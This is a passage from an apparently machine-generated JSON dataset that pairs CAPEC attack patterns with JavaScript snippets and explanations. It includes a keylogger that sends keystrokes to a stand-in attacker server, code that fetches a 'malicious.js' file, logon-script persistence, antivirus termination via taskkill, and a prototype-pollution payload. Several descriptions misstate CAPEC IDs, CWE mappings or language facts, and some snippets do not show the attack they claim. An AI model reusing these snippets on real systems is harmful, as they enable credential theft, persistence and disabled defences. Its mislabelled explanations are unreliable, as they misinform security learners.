        "description": "This JavaScript code snippet demonstrates a connection to a Windows Admin Share using hardcoded, weak credentials. The code uses the 'net' module to create a socket connection to a specified IP address and port (445, commonly used for SMB). The credentials are transmitted in plain text, representing CWE-522 (Insufficiently Protected Credentials). The use of a weak password (CWE-521) and single-factor authentication (CWE-308) is evident. The code does not implement any password aging mechanism (CWE-262) or dual-factor authentication, making it vulnerable to various attacks, including capture-replay (CWE-294). This snippet embodies the main idea of the CAPEC by showing how an adversary could use stolen or guessed credentials to access Windows Admin Shares."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "const fs = require('fs');\nconst path = '/shared/location/file.txt';\n\n// CWE-284: Improper Access Control\nfs.chmodSync(path, 0o777); // Set file permissions to be writable by anyone\n\n// CWE-378: Creation of Temporary File With Insecure Permissions\nconst tempFile = '/shared/location/tempfile.txt';\nfs.writeFileSync(tempFile, 'Temporary data', { mode: 0o666 }); // Insecure permissions\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nconst dangerousFile = '/shared/location/malicious.js';\nfs.writeFileSync(dangerousFile, 'console.log(\"Malicious code executed\");');\n\n// CWE-494: Download of Code Without Integrity Check\nconst https = require('https');\nhttps.get('https://example.com/malicious.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => { fs.writeFileSync('/shared/location/downloaded.js', data); });\n});\n\n// CWE-433: Unparsed Raw Web Content Delivery\nfs.writeFileSync('/shared/location/raw.html', '<script>alert(\"Raw content executed\");</script>');",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the 'Modify Shared File' CAPEC. It includes: 1) CWE-284: Improper Access Control by setting file permissions to be writable by anyone. 2) CWE-378: Creation of Temporary File With Insecure Permissions by creating a temporary file with insecure permissions. 3) CWE-434: Unrestricted Upload of File with Dangerous Type by writing a malicious JavaScript file to a shared location. 4) CWE-494: Download of Code Without Integrity Check by downloading and saving a script from a remote location without verifying its integrity. 5) CWE-433: Unparsed Raw Web Content Delivery by writing raw HTML content that includes a script tag to a shared location. This code represents the main idea of the CAPEC by showing how an adversary can manipulate files in a shared location to execute malicious content when accessed by users."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'public', uploadedFile.name);\n\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This code snippet demonstrates a basic Express.js server that allows file uploads to a public directory. The server uses the 'express-fileupload' middleware to handle file uploads. When a file is uploaded via a POST request to the '/upload' endpoint, it is saved directly to the 'public' directory under the web root. This setup embodies the CAPEC 'Add Malicious File to Shared Webroot' by allowing an adversary to upload potentially malicious files to a location that can be accessed and executed by the web server. The code also highlights several related CWEs: CWE-284 (Improper Access Control) as there are no access controls on the uploaded files, CWE-219 (Storage of File with Sensitive Data Under Web Root) as files are stored under the web root, CWE-433 (Unparsed Raw Web Content Delivery) as the server does not parse or sanitize the uploaded files, and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) as the server relies on the file name and extension provided by the user."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "const fs = require('fs');\nconst logonScriptPath = '/etc/profile.d/logon.sh';\n\n// CWE-798: Use of Hard-coded Credentials\nconst hardCodedPassword = 'P@ssw0rd123';\n\n// CWE-284: Improper Access Control\nfs.chmodSync(logonScriptPath, '777');\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nfunction runAsAdmin(command) {\n  // Simulate running a command with elevated privileges\n  console.log(`Running as admin: ${command}`);\n}\n\n// CWE-603: Use of Client-Side Authentication\nfunction authenticateUser(username, password) {\n  if (username === 'admin' && password === hardCodedPassword) {\n    return true;\n  }\n  return false;\n}\n\n// Main idea: Modify logon script to maintain persistence\nif (authenticateUser('admin', hardCodedPassword)) {\n  const maliciousCode = '\\necho \"Malicious code executed\"';\n  fs.appendFileSync(logonScriptPath, maliciousCode);\n  runAsAdmin('chmod +x ' + logonScriptPath);\n  console.log('Logon script modified to include malicious code.');\n} else {\n  console.log('Authentication failed.');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker modifies a logon script to maintain persistence on a system. The code includes several vulnerabilities: CWE-798 (Use of Hard-coded Credentials) with a hard-coded password, CWE-284 (Improper Access Control) by setting the logon script to be writable by anyone, CWE-520 (Impersonation) by simulating running commands with elevated privileges, and CWE-603 (Client-Side Authentication) by performing authentication on the client side. If the hard-coded credentials are correct, the script appends malicious code to the logon script, ensuring it runs every time a user logs in."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nconst commonPasswords = ['password123', '123456', 'qwerty'];\n\nfunction passwordSpray(users, passwords) {\n  for (let password of passwords) {\n    for (let user of users) {\n      if (authenticate(user, password)) {\n        console.log(`User ${user} authenticated with password ${password}`);\n        return;\n      }\n    }\n  }\n}\n\nfunction authenticate(user, password) {\n  // Simulate authentication check\n  const userPassword = getUserPassword(user);\n  return userPassword === password;\n}\n\nfunction getUserPassword(user) {\n  // Simulate fetching user password from database\n  const userPasswords = {\n    'user1': 'password123',\n    'user2': 'password123',\n    'user3': 'password123'\n  };\n  return userPasswords[user];\n}\n\npasswordSpray(users, commonPasswords);",
        "description": "This JavaScript code snippet demonstrates a basic password spraying attack. The `passwordSpray` function iterates over a list of common passwords and attempts to authenticate each user with each password. The `authenticate` function simulates checking the provided password against the stored password for each user. The `getUserPassword` function simulates retrieving the stored password for a user from a database. This code embodies the main idea of CAPEC-111 (Password Spraying) by showing how an attacker might try a small list of common passwords against multiple user accounts to gain access. The related CWEs are represented by the use of weak passwords, lack of multi-factor authentication, and improper restriction of excessive authentication attempts."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "const crypto = require('crypto');\n\nfunction hashPassword(password) {\n  const hash = crypto.createHash('sha256');\n  hash.update(password);\n  return hash.digest('hex');\n}\n\nconst password = 'user_password';\nconst hashedPassword = hashPassword(password);\nconsole.log(`Hashed Password: ${hashedPassword}`);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of password hashing. The function `hashPassword` uses the SHA-256 hashing algorithm to hash a password without incorporating a salt. This approach is vulnerable to precomputed hash attacks (rainbow tables) because the same password will always produce the same hash. The code embodies the deprecated CAPEC concept of 'Dump Password Hashes' by showing how password hashes can be generated insecurely. It also relates to CWE-759 (Use of a One-Way Hash without a Salt) and CWE-760 (Use of a One-Way Hash with a Predictable Salt) by illustrating the lack of a salt in the hashing process."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\n// Using an obsolete function to read a file\nfs.readFile('/path/to/sensitive/data.txt', 'utf8', (err, data) => {\n  if (err) throw err;\n  console.log('Sensitive Data:', data);\n});\n\n// Making a security decision based on DNS lookup\nconst domain = 'example.com';\ndns.lookup(domain, (err, address) => {\n  if (err) throw err;\n  if (address === '192.168.1.1') {\n    console.log('Access granted to sensitive operation');\n  } else {\n    console.log('Access denied');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the deprecated CAPEC concept of obtaining data via utilities, incorporating related deprecated CWEs and an active one. The code uses the 'fs.readFile' function, which is not deprecated but represents a simplistic and potentially insecure way to handle sensitive data (related to CWE-217 and CWE-218). Additionally, it makes a security decision based on a DNS lookup (related to CWE-247), which is insecure because DNS responses can be spoofed. The code also highlights the use of potentially obsolete or insecure practices, aligning with CWE-477."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "document.addEventListener('keydown', function(event) {\n  var keylog = localStorage.getItem('keylog') || '';\n  keylog += event.key;\n  localStorage.setItem('keylog', keylog);\n});\n\n// Simulate sending the captured keystrokes to an attacker\nfunction sendKeylog() {\n  var keylog = localStorage.getItem('keylog');\n  if (keylog) {\n    fetch('http://malicious-server.com/steal', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json'\n      },\n      body: JSON.stringify({ data: keylog })\n    });\n    localStorage.removeItem('keylog');\n  }\n}\n\n// Periodically send the captured keystrokes\nsetInterval(sendKeylog, 60000);",
        "description": "This JavaScript code snippet demonstrates a simple keylogger that captures all keystrokes made by a user and stores them in the browser's localStorage. The 'keydown' event listener logs each key pressed by the user. The 'sendKeylog' function simulates sending the captured keystrokes to a malicious server every 60 seconds. This code embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by capturing user input, which could include sensitive information like passwords. The related CWEs provide context on potential weaknesses, such as the use of weak or hard-coded credentials (CWE-798, CWE-521), insufficiently protected credentials (CWE-522), and the use of password systems for primary authentication (CWE-309)."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Log sensitive information to a file\n      fs.appendFile('user_data.log', body, (err) => {\n        if (err) throw err;\n      });\n      res.end('Data received');\n    });\n  } else {\n    res.end('Send a POST request');\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests. When a POST request is received, it captures the data sent by the user and logs it to a file named 'user_data.log'. This embodies the main idea of CAPEC-Collect Data as Provided by Users, as it captures and stores user-provided information without any deception. The code also touches on related CWEs: it exposes sensitive information (CWE-200) by logging it to a file, which could be accessed by unauthorized actors (CWE-497). Additionally, the use of a log file without proper access controls can lead to exposure of sensitive system information (CWE-214)."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const user = queryObject.user;\n\n  // Deprecated function usage\n  if (user == 'admin') {\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.write('Welcome Admin!');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/html'});\n    res.write('Access Denied');\n  }\n  res.end();\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that checks the 'user' query parameter to determine if the user is 'admin'. If the user is 'admin', it grants access; otherwise, it denies access. The code uses the deprecated '==' operator for comparison, which can lead to authentication bypass issues (CWE-592). Additionally, it does not handle potential errors from the 'url.parse' function (CWE-391). This snippet embodies the main idea of the deprecated CAPEC 'Signature-Based Avoidance' by demonstrating the use of deprecated functions and unchecked error conditions, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "const fs = require('fs');\nconst logFilePath = '/var/log/app.log';\n\nfunction logEvent(event) {\n  // CWE-778: Insufficient Logging\n  if (!event || !event.message) {\n    return;\n  }\n\n  // CWE-532: Insertion of Sensitive Information into Log File\n  if (event.sensitive) {\n    console.warn('Sensitive information detected, not logging.');\n    return;\n  }\n\n  // CWE-779: Logging of Excessive Data\n  if (event.message.length > 1000) {\n    console.warn('Event message too long, not logging.');\n    return;\n  }\n\n  // Simulate blocking the log from being sent to a central repository\n  try {\n    fs.appendFileSync(logFilePath, `${new Date().toISOString()} - ${event.message}\\n`);\n  } catch (err) {\n    console.error('Failed to write to log file:', err);\n  }\n}\n\n// Example usage\nlogEvent({ message: 'User login attempt', sensitive: false });",
        "description": "This JavaScript code snippet demonstrates a logging function that embodies the CAPEC 'Block Logging to Central Repository' by simulating the prevention of logs being sent to a central location. The function includes checks for CWE-778 (Insufficient Logging) by ensuring the event has a message, CWE-532 (Insertion of Sensitive Information into Log File) by avoiding logging sensitive information, and CWE-779 (Logging of Excessive Data) by limiting the length of the log message. The logEvent function attempts to write logs to a local file, simulating the blocking of logs from being sent to a central repository, which aligns with the main idea of the CAPEC."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "const fs = require('fs');\n\nfunction inflateFileSize(filePath) {\n  try {\n    // Read the original file content\n    let data = fs.readFileSync(filePath, 'utf8');\n    \n    // Append a large amount of data to the file\n    let largeData = 'A'.repeat(10 * 1024 * 1024); // 10MB of 'A'\n    data += largeData;\n    \n    // Write the inflated data back to the file\n    fs.writeFileSync(filePath, data, 'utf8');\n    console.log('File size inflated successfully.');\n  } catch (err) {\n    console.error('Error inflating file size:', err);\n  }\n}\n\n// Example usage\ninflateFileSize('example.txt');",
        "description": "This JavaScript code snippet demonstrates how an adversary might artificially inflate the size of a file, which aligns with the CAPEC description of 'Artificially Inflate File Sizes'. The function `inflateFileSize` reads the content of a specified file, appends a large amount of data (10MB of 'A' characters), and writes the inflated content back to the file. This can lead to a Denial of Service condition on systems with limited storage capacity. The code also touches on CWE-774 by not imposing any restrictions on file size, CWE-434 by potentially allowing dangerous file types to be manipulated, and CWE-646 by relying on the file name for operations. The snippet is a simple yet effective demonstration of how file size inflation can be achieved programmatically."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nexec('ps aux', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error executing command: ${error}`);\n    return;\n  }\n  console.log(`Current Processes:\\n${stdout}`);\n});",
        "description": "This JavaScript code snippet uses Node.js's 'child_process' module to execute the 'ps aux' command, which lists all running processes on a Unix-like system. The output of this command is then printed to the console. This embodies the main idea of CAPEC-170 (Process Footprinting) by exposing information about currently running processes. The code snippet is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) because it exposes potentially sensitive information about the system's processes to any user who can run this script. This information could be used by an adversary to learn about the target environment and plan further malicious activities."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction getServiceInfo() {\n  exec('tasklist /svc', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Service Information: ${stdout}`);\n  });\n}\n\ngetServiceInfo();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command ('tasklist /svc') that retrieves information about the services running on the target system. The 'exec' function from the 'child_process' module is used to run the command. The output, which includes sensitive system information, is then logged to the console. This code embodies the main idea of the CAPEC 'Services Footprinting' by demonstrating how an adversary could exploit functionality meant for authorized users to gather information about the services on a target system. The related CWEs are represented by the exposure of sensitive information (CWE-200, CWE-497) and the invocation of a process with visible sensitive information (CWE-214)."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction getUserAccounts() {\n  exec('net user', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error executing command: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Error in command output: ${stderr}`);\n      return;\n    }\n    console.log(`User Accounts: ${stdout}`);\n  });\n}\n\ngetUserAccounts();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command ('net user') that retrieves information about user accounts on a Windows system. The 'exec' function from the 'child_process' module is used to run the command. The output, which includes sensitive information about user accounts, is then logged to the console. This code embodies the main idea of the CAPEC 'Account Footprinting' by demonstrating how an adversary could exploit system commands to gather information about domain accounts. The related CWEs are represented by the exposure of sensitive information (CWE-200, CWE-497) and the invocation of a process with potentially visible sensitive information (CWE-214)."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction listLocalGroups() {\n  exec('net localgroup', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Local Groups: ${stdout}`);\n  });\n}\n\nlistLocalGroups();",
        "description": "This JavaScript code snippet uses Node.js's 'child_process' module to execute the Windows command 'net localgroup', which lists all local groups on the system. The output is then printed to the console. This embodies the main idea of CAPEC-168 (Group Permission Footprinting) by demonstrating how an adversary could exploit functionality to gather information about user groups and their permissions. The code also touches on related CWEs: it exposes sensitive information (CWE-200), and if misused, could lead to unauthorized access or incorrect group placements (CWE-842, CWE-529). The command execution with visible output (CWE-214) and potential creation of emergent resources (CWE-1229) are also relevant considerations."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction getUserLastLoginTimes(directory) {\n  const files = fs.readdirSync(directory);\n  const userLoginTimes = {};\n\n  files.forEach(file => {\n    if (file === 'ntuser.dat') {\n      const filePath = path.join(directory, file);\n      const stats = fs.statSync(filePath);\n      userLoginTimes[directory] = stats.mtime;\n    }\n  });\n\n  return userLoginTimes;\n}\n\nconst userDirectories = ['/home/user1', '/home/user2'];\nuserDirectories.forEach(dir => {\n  const loginTimes = getUserLastLoginTimes(dir);\n  console.log(`User directory: ${dir}, Last login time: ${loginTimes[dir]}`);\n});",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit the 'Owner Footprinting' vulnerability by accessing the last modified times of 'ntuser.dat' files in user directories. The code iterates through a list of user directories, checks for the presence of 'ntuser.dat' files, and retrieves their last modified times, which can indicate the last login times of the users. This information can be used to inform further targeted malicious behavior. The code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by exposing sensitive login times, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by accessing system-level information without proper authorization."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "const exec = require('child_process').exec;\n\n// Hard-coded credentials (CWE-798)\nconst adminPassword = 'admin123';\n\n// Function to disable security software\nfunction disableSecuritySoftware(password) {\n  if (password === adminPassword) { // Improper Access Control (CWE-284)\n    // Command to kill a security software process (e.g., antivirus)\n    exec('taskkill /F /IM antivirus.exe', (error, stdout, stderr) => {\n      if (error) {\n        console.error(`Error: ${error.message}`);\n        return;\n      }\n      if (stderr) {\n        console.error(`Stderr: ${stderr}`);\n        return;\n      }\n      console.log(`Stdout: ${stdout}`);\n    });\n  } else {\n    console.log('Access Denied: Incorrect Password');\n  }\n}\n\ndisableSecuritySoftware('admin123');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can disable security software by exploiting improper access control (CWE-284) and using hard-coded credentials (CWE-798). The function `disableSecuritySoftware` takes a password as an argument and checks it against a hard-coded admin password. If the password matches, it executes a command to kill a security software process (e.g., an antivirus program). This represents the CAPEC 'Disable Security Software' by showing how an attacker could disable security tools to avoid detection. The use of hard-coded credentials and improper access control makes it easy for an attacker to exploit this vulnerability."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-798: Use of Hard-coded Credentials\nconst hardCodedPassword = 'password123';\n\n// CWE-427: Uncontrolled Search Path Element\nconst dllPath = path.join('C:', 'Windows', 'System32', 'malicious.dll');\n\n// CWE-15: External Control of System or Configuration Setting\nconst registryKey = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit';\n\n// Function to simulate modifying the registry key to load a malicious DLL\nfunction modifyRegistry() {\n  try {\n    // CWE-520: .NET Misconfiguration: Use of Impersonation\n    // Simulating elevated access to modify registry\n    if (process.getuid && process.getuid() !== 0) {\n      throw new Error('Elevated privileges required');\n    }\n    // Simulate writing to the registry (in reality, this would require native modules or external tools)\n    fs.writeFileSync(registryKey, dllPath);\n    console.log('Registry key modified to load malicious DLL at startup');\n  } catch (error) {\n    console.error('Failed to modify registry:', error);\n  }\n}\n\nmodifyRegistry();",
        "description": "This JavaScript code snippet demonstrates a potential attack vector where an adversary modifies a Windows registry key to load a malicious DLL at startup. The code includes several CWE-related vulnerabilities: hard-coded credentials (CWE-798), uncontrolled search path element (CWE-427), and external control of system or configuration settings (CWE-15). The function `modifyRegistry` simulates the modification of the registry key `Userinit` to point to a malicious DLL, representing the main idea of the CAPEC 'Replace Winlogon Helper DLL'. The code also checks for elevated privileges, simulating a .NET misconfiguration scenario (CWE-520)."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const url = req.url;\n  if (url === '/config') {\n    // CWE-204: Observable Response Discrepancy\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Configuration details: {\"db\": \"localhost\", \"port\": 3306}');\n  } else if (url === '/status') {\n    // CWE-208: Observable Timing Discrepancy\n    setTimeout(() => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('System is up and running');\n    }, 1000); // Deliberate delay\n  } else if (url === '/search') {\n    // CWE-426: Untrusted Search Path\n    const searchPath = req.query.path;\n    const fs = require('fs');\n    fs.readFile(searchPath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.end('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests and responds based on the URL path. It demonstrates several vulnerabilities related to the CAPEC 'System Footprinting' and associated CWEs:\n\n1. **CWE-204: Observable Response Discrepancy** - When accessing the '/config' endpoint, the server reveals sensitive configuration details, which can be used by an adversary to gather information about the system.\n\n2. **CWE-208: Observable Timing Discrepancy** - The '/status' endpoint introduces a deliberate delay before responding, which can be used by an attacker to infer the system's state based on response times.\n\n3. **CWE-426: Untrusted Search Path** - The '/search' endpoint reads a file from a path provided by the user, which can lead to the exposure of sensitive files if the path is not properly validated.\n\nOverall, the code represents the concept of 'System Footprinting' by allowing an adversary to probe and gather information about the system through observable discrepancies and improper handling of sensitive data."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getSecurityTools() {\n  exec('wmic product get name, version', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    const securityTools = stdout.split('\\n').filter(line => /antivirus|firewall|security/i.test(line));\n    console.log('Installed Security Tools:', securityTools);\n  });\n}\n\ngetSecurityTools();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command that retrieves a list of installed software products on a Windows system. It then filters this list to identify security tools such as antivirus, firewall, or other security-related software. The code demonstrates the concept of 'Security Software Footprinting' by attempting to gather information about installed security tools. This can be seen as an example of CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) because it exposes sensitive information about the system's security configuration. The use of 'exec' to run system commands can also be risky if not properly sanitized, potentially leading to CWE-1395 (Dependency on Vulnerable Third-Party Component) if the command or its output is manipulated by an attacker."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "const net = require('net');\n\n// Vulnerable server setup\nconst server = net.createServer((socket) => {\n  console.log('Client connected');\n\n  // Improper enforcement of message integrity (CWE-924)\n  socket.on('data', (data) => {\n    console.log('Received data:', data.toString());\n  });\n\n  // Incorrectly specified destination (CWE-941)\n  socket.write('Hello, client!');\n\n  // Improper restriction of communication channel (CWE-923)\n  socket.on('end', () => {\n    console.log('Client disconnected');\n  });\n});\n\n// Race condition during access to alternate channel (CWE-421)\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// Simulate route disabling by closing the server\nsetTimeout(() => {\n  console.log('Disabling route...');\n  server.close(() => {\n    console.log('Route disabled. Server closed.');\n  });\n}, 10000); // Disable route after 10 seconds",
        "description": "This JavaScript code snippet sets up a basic TCP server using the 'net' module. The server is vulnerable to several weaknesses: it does not enforce message integrity (CWE-924), it may incorrectly specify the destination (CWE-941), and it does not properly restrict the communication channel to intended endpoints (CWE-923). Additionally, there is a potential race condition during access to an alternate channel (CWE-421). The main idea of the CAPEC (Route Disabling) is represented by the server being closed after 10 seconds, simulating the disabling of the network route between two targets."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "const fs = require('fs');\n\nfunction disableNetworkHardware() {\n  try {\n    // Simulate disabling network hardware by modifying a critical configuration file\n    fs.writeFileSync('/etc/network/interfaces', '');\n    console.log('Network hardware disabled.');\n  } catch (err) {\n    console.error('Failed to disable network hardware:', err);\n  }\n}\n\ndisableNetworkHardware();",
        "description": "This JavaScript code snippet simulates the disabling of network hardware by modifying a critical configuration file. The `disableNetworkHardware` function attempts to overwrite the '/etc/network/interfaces' file, which is typically used to configure network interfaces on Unix-like systems. By writing an empty string to this file, the code effectively disables the network hardware, preventing it from performing its intended service. This action embodies the main idea of the CAPEC 'Disabling Network Hardware' by demonstrating how an adversary might disrupt network services. The code also touches on related CWEs, such as 'Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation' (CWE-1304) and 'Improper Restriction of Software Interfaces to Hardware Features' (CWE-1256), by showing how improper handling of critical configuration files can lead to security vulnerabilities."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "const net = require('net');\n\nconst BGP_PORT = 179;\nconst TARGET_AS = '192.0.2.1';\nconst MALICIOUS_AS = '198.51.100.1';\n\nconst client = new net.Socket();\nclient.connect(BGP_PORT, TARGET_AS, () => {\n  console.log('Connected to target AS');\n  // Send a BGP update message to withdraw a route\n  const bgpWithdrawMessage = Buffer.from('withdraw route message');\n  client.write(bgpWithdrawMessage);\n  console.log('Sent BGP withdraw message');\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString());\n  // Simulate incorrect destination by redirecting to malicious AS\n  client.connect(BGP_PORT, MALICIOUS_AS, () => {\n    console.log('Redirected to malicious AS');\n    client.write(data);\n  });\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a BGP Route Disabling attack. It connects to a target Autonomous System (AS) and sends a BGP update message to withdraw a route, effectively making the network inaccessible. The code also simulates an incorrect destination by redirecting the connection to a malicious AS. This embodies the main idea of CAPEC-147: BGP Route Disabling, and incorporates related CWEs such as CWE-941 (Incorrectly Specified Destination in a Communication Channel) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel). The code highlights how an adversary can manipulate BGP messages to disrupt network availability."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  // CWE-601: Open Redirect\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n    return;\n  }\n\n  // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n  const clientIp = req.connection.remoteAddress;\n  require('dns').reverse(clientIp, (err, hostnames) => {\n    if (err || !hostnames.length) {\n      res.writeHead(403, { 'Content-Type': 'text/plain' });\n      res.end('Access Denied');\n      return;\n    }\n\n    // CWE-79: Cross-site Scripting (XSS)\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end(`<h1>Welcome, ${hostnames[0]}</h1>`);\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that demonstrates several security weaknesses related to the CAPEC 'DNS Domain Seizure'. The server processes incoming requests and performs actions based on user input and DNS resolution.\n\n1. CWE-601 (Open Redirect): The server checks for a 'redirect' query parameter and redirects the user to the specified URL without validation, which can be exploited for phishing attacks.\n\n2. CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action): The server performs a reverse DNS lookup on the client's IP address to obtain the hostname and makes a security decision based on the result. This can be manipulated if the DNS resolution is not reliable.\n\n3. CWE-79 (Cross-site Scripting): The server includes the resolved hostname in the HTML response without proper sanitization, making it vulnerable to XSS attacks.\n\nThe code represents the main idea of the CAPEC by showing how an attacker could exploit DNS resolution and other vulnerabilities to disrupt or manipulate access to a service."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "const net = require('net');\n\nclass SensitiveData {\n  constructor(secret) {\n    this.secret = secret;\n  }\n}\n\nfunction deserialize(data) {\n  return JSON.parse(data);\n}\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    try {\n      const obj = deserialize(data);\n      console.log('Deserialized object:', obj);\n    } catch (e) {\n      console.error('Deserialization error:', e);\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Malicious payload example\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  const maliciousPayload = '{\"__proto__\":{\"polluted\":\"yes\"}}';\n  client.write(maliciousPayload);\n  client.end();\n});",
